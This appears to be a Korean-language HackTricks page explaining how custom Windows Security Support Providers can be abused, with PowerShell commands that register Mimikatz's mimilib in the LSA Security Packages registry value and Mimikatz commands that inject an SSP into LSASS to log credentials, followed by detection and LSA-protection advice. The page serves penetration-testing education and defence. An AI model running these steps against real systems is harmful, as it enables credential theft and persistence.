# Custom Security Support Providers

{{#include ../../banners/hacktricks-training.md}}

[보안 지원 공급자(SSP)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)는 Local Security Authority(LSA)가 로드하는 DLL 기반 보안 패키지입니다. Windows는 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` `REG_MULTI_SZ` 값을 통해 사용자 지정 SSP/AP DLL을 등록하며, 시스템이 시작될 때 등록된 패키지를 로드합니다.<sup>[[1]](#references)</sup>

SSP는 LSA에서 실행되고 credentials를 수신할 수 있으므로, adversary는 악성 패키지를 credentials access 및 persistence에 악용할 수 있습니다. MITRE는 이 동작을 T1547.005로 추적합니다.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz에는 로드된 후 처리되는 credentials를 기록하는 SSP를 구현한 `mimilib.dll`이 포함되어 있습니다. authorized lab에서는 대상 architecture에 맞는 DLL을 `C:\Windows\System32`에 배치한 다음, 변경하기 전에 현재 패키지 목록을 확인합니다.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
일반적인 기존 값에는 `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg`, `pku2u`와 같은 package가 포함될 수 있습니다. custom package를 추가할 때 기존 항목을 모두 보존하세요.<sup>[[1]](#references)</sup>

기존 package를 대체하지 말고 `mimilib`를 추가하세요:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
재부팅 후 이 구현에 의해 패키지가 LSA에 로드되며, 이후 캡처된 자격 증명은 `C:\Windows\System32\kiwissp.log`에 기록됩니다.<sup>[[2]](#references)[[3]](#references)</sup>

## 메모리 내 로딩

Mimikatz는 현재 LSASS 프로세스에 자체 SSP 구현을 주입할 수도 있습니다:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
이 방법은 재부팅 후에도 지속되지 않습니다.<sup>[[2]](#references)[[3]](#references)</sup>

## Detection and Mitigation

`...\Lsa\Security Packages`의 변경 사항과 `lsass.exe`에 로드되는 예상치 못한 DLL을 모니터링합니다. Security event 4657은 관련 Audit Registry 정책과 SACL이 구성된 경우에만 레지스트리 **value** 수정 사항을 기록합니다.<sup>[[2]](#references)[[4]](#references)</sup>

호환되는 경우 추가 LSA protection을 활성화하고 서명되지 않았거나 예상치 못한 SSP DLL을 조사합니다. Microsoft는 자격 증명을 손상시킬 수 있는 code injection에 대한 대응 수단으로 LSA protection을 명시적으로 문서화하고 있습니다.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - SSP/AP DLL 등록](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Mimikatz repository - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Security event 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - 추가 LSA protection 구성](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
